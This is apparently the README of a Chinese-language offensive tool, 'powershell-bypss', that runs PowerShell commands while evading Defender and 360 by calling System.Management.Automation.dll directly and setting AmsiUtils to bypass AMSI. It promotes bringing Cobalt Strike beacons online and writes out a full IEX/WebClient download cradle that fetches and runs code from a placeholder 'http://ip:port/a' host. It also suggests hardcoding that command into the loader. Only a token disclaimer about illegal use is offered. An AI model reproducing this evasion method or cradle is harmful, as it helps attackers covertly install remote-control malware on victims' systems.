# powershell-bypss

powershell命令免杀的小工具，可过Defender、360等，可执行上线cobaltstrike、添加计划任务等。

AMSI绕过+Automation执行powershell命令

**请勿使用于任何非法用途，由此产生的后果自行承担。**

**理论上来说可以免杀执行任意powershell命令，但是调用了如schtask这类被监控的程序还是会被查杀的。**

上述测试环境均为实体机。

思路很简单，很久之前就有了，工具调用C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation目录下面的System.Management.Automation.dll执行底层api来绕过杀软对powershell的监控，同时绕过AMSI的检测。由于patch绕过AMSI的方法会被360查杀，因此这里使用了设置System.Management.Automation.AmsiUtils的方法来绕过。

这里用+加号替换了命令中空格，当然这就是一个命令的加载器，具体怎么加密命令有各种各样的方法。

由于是C#，因此可以用execute-assembly内存执行的方式来不落地执行，不过cs本身的powerpick就实现了这个功能，这里只是单拿出来做一个小工具。

**师傅们注意避免用powershell命令，上线cobaltstrike只需要```Csharp.exe IEX+((new-object+net.webclient).downloadstring('http://ip:port/a'))```裸命令，如果以powershell开头那么还是会调用powershell被360拦截的。**

**想单纯来上线cs的师傅可以把IEX开头的powershell命令写定在程序里的myPipeLine.Commands.AddScript参数中**

![32430eaf1b8ae7db520dd85e5cc82bf](https://user-images.githubusercontent.com/48757788/198879143-1caaf6d9-2ed9-4894-9233-10ff7aa7ad39.jpg)

![d559a936be1592a0bcbbaff24e88dc8](https://user-images.githubusercontent.com/48757788/198879156-82253c57-ff50-4b21-be0d-d71253db032b.jpg)





